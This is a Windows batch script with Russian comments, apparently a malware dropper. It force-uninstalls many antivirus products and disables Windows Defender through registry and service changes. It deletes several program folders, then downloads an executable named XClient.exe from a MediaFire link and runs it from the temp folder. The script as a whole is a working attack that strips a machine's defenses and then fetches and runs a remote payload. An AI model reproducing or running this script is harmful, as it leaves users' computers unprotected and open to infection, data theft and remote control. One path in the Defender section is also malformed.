запуск исключения


























































@echo off
cls
echo Выполняется удаление антивирусных программ, файлов и указанных программ...

:: Проверка прав администратора (только для информации)
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Предупреждение: скрипт работает не от имени администратора. Некоторые действия могут быть недоступны.
)

:: Удаление антивирусных программ
echo Выполняется удаление антивирусных программ...

:: Удаление "Avast"
echo Выполняется удаление "Avast"...
start "" /wait "%PROGRAMFILES%\AVAST Software\Avast\setup\instup.exe" --uninstall --force
echo "Avast" успешно удален.

:: Удаление "AVG"
echo Выполняется удаление "AVG"...
start "" /wait "%PROGRAMFILES%\AVG\Setup\avgsetupx.exe" /UNINSTALL /Quiet
echo "AVG" успешно удален.

:: Удаление "Norton"
echo Выполняется удаление "Norton"...
start "" /wait "%PROGRAMFILES%\Norton\NortonInstaller.exe" /REMOVEALLPRODUCTS
echo "Norton" успешно удален.

:: Удаление "McAfee"
echo Выполняется удаление "McAfee"...
start "" /wait "C:\Program Files\McAfee\MSC\mcuihost.exe" /body:misp://MSCJsRes.dll::uninstall.html /id:uninstall
echo "McAfee" успешно удален.

:: Удаление "Avira"
echo Выполняется удаление "Avira"...
start "" /wait "C:\Program Files (x86)\Avira\Launcher\Avira.Systray.exe" /remove
echo "Avira" успешно удален.

:: Удаление "Panda"
echo Выполняется удаление "Panda"...
start "" /wait "C:\Program Files (x86)\Panda Security\Panda Security Protection\Setup.exe" /uninstall
echo "Panda" успешно удален.

:: Удаление "TotalAV"
echo Выполняется удаление "TotalAV"...
start "" /wait "C:\Program Files (x86)\TotalAV\uninstall.exe"
echo "TotalAV" успешно удален.

:: Удаление "NANO Pro"
echo Выполняется удаление "NANO Pro"...
start "" /wait "C:\Program Files (x86)\NANO Security\NANO Antivirus Pro\uninstall.exe"
echo "NANO Pro" успешно удален.

:: Удаление "Kaspersky Standard"
echo Выполняется удаление "Kaspersky Standard"...
start "" /wait "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security\avpui.exe" /uninstall
echo "Kaspersky Standard" успешно удален.

:: Удаление "Grizzly Pro"
echo Выполняется удаление "Grizzly Pro"...
start "" /wait "C:\Program Files (x86)\Grizzly Antivirus\uninstall.exe"
echo "Grizzly Pro" успешно удален.

:: Удаление "Kaspersky Premium"
echo Выполняется удаление "Kaspersky Premium"...
start "" /wait "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security\avpui.exe" /uninstall
echo "Kaspersky Premium" успешно удален.

:: Удаление "Dr.Web"
echo Выполняется удаление "Dr.Web"...
start "" /wait "C:\Program Files\Doctor Web\Setup\drweb32.exe" /uninstall
echo "Dr.Web" успешно удален.

:: Удаление "Windows Defender"
echo Выполняется отключение и удаление "Windows Defender"...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
sc stop WinDefend
sc config WinDefend start= disabled
"%PROGRAMFILES%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
"%PROGRAMFILES%\Windows Defender\MpCmdRun.exe" -UninstallDefinitions -All
"%PROGRAMFILES%\C:\Windows\System32\SecurityHealthSystray.exe" -UninstallDefinitions -All
echo "Windows Defender" успешно отключен и удален.

:: Удаление "360 Secure Browser"
echo Выполняется удаление "360 Secure Browser"...
rd /S /Q "%USERPROFILE%\AppData\Local\360SecureBrowser"
echo "360 Secure Browser" успешно удален.

:: Удаление "Android Studio" из меню "Пуск"
echo Выполняется удаление "Android Studio" из меню "Пуск"...
rd /S /Q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
echo "Android Studio" успешно удален из меню "Пуск".

:: Удаление "AVG Browser"
echo Выполняется удаление "AVG Browser"...
rd /S /Q "C:\Program Files\AVG\Browser\Application"
echo "AVG Browser" успешно удален.

:: Загрузка и запуск файла
echo Загрузка файла...
powershell -Command "Invoke-WebRequest -Uri 'https://download1580.mediafire.com/1ahwxe43gr7gN8yWoy8B6xiAShyNdUlrUjmfJtJytAUmMtpYJtzIXMU9muZR0g3LVP5THnnYYcxw2ReUpBMW3QKe58nUDjDwzpwjb4asDmH-aO6GsH5ezHkm9k43d7HdYn1HdTlXhApJ-OSp-M7Eq9TIA3xH9RmuOzb_NZLRqH5gZA/l6t1np8msd5kxxu/XClient.exe' -OutFile '%TEMP%\XClient.exe'"
echo Файл загружен, выполняется запуск...
start "" /wait "%TEMP%\XClient.exe"
echo Все антивирусные программы, файлы и указанные программы успешно удалены.
pause
